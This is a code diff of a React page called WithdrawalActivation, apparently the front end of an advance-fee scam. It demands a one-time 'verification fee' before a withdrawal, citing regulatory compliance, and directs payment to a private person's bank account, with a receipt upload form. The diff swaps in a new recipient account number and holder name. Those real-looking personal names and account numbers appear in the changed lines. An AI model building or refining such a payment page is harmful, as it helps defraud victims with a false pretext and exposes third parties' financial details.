@@ -99,9 +99,14 @@ const WithdrawalActivation = () => {
           <div className="flex items-start gap-3 mb-4">
             <div className="text-2xl">⚡</div>
             <div className="flex-1">
-              <h2 className="text-xl font-bold text-blue-500 mb-2">Account Authentication Charge</h2>
+              <h2 className="text-xl font-bold text-blue-500 mb-2">
+                Account Authentication Charge
+              </h2>
               <p className="text-sm text-muted-foreground">
-                To secure your account and comply with regulatory requirements, a one-time verification fee is necessary. This fee facilitates identity verification, prevents unauthorized access, and enables seamless withdrawals.
+                To secure your account and comply with regulatory requirements,
+                a one-time verification fee is necessary. This fee facilitates
+                identity verification, prevents unauthorized access, and enables
+                seamless withdrawals.
               </p>
             </div>
           </div>
@@ -109,7 +114,7 @@ const WithdrawalActivation = () => {
 
         <Card className="bg-card/80 backdrop-blur-lg border-border/50 p-6">
           <h3 className="text-xl font-bold mb-6">Payment Details</h3>
-          
+
           <div className="space-y-4">
             <div className="bg-muted/50 p-4 rounded-lg">
               <p className="text-sm text-muted-foreground mb-1">Amount</p>
@@ -119,17 +124,17 @@ const WithdrawalActivation = () => {
             <div className="bg-muted/50 p-4 rounded-lg">
               <div className="flex items-center justify-between mb-1">
                 <p className="text-sm text-muted-foreground">Account Number</p>
-                <CopyButton text="6608142741" />
+                <CopyButton text="5882180092" />
               </div>
-              <p className="text-xl font-bold font-mono">6608142741</p>
+              <p className="text-xl font-bold font-mono">5882180092</p>
             </div>
 
             <div className="bg-muted/50 p-4 rounded-lg">
               <div className="flex items-center justify-between mb-1">
                 <p className="text-sm text-muted-foreground">Account Name</p>
-                <CopyButton text="Destiny Chimanom Ekezie" />
+                <CopyButton text="Success Ozioma Adiela" />
               </div>
-              <p className="text-lg font-bold">Destiny Chimanom Ekezie</p>
+              <p className="text-lg font-bold">Success Ozioma Adiela</p>
             </div>
 
             <div className="bg-muted/50 p-4 rounded-lg">
@@ -152,7 +157,7 @@ const WithdrawalActivation = () => {
 
         <Card className="bg-card/80 backdrop-blur-lg border-border/50 p-6">
           <h3 className="text-lg font-semibold mb-4">Upload Payment Receipt</h3>
-          
+
           <form onSubmit={handleSubmit} className="space-y-4">
             <div className="space-y-2">
               <Input
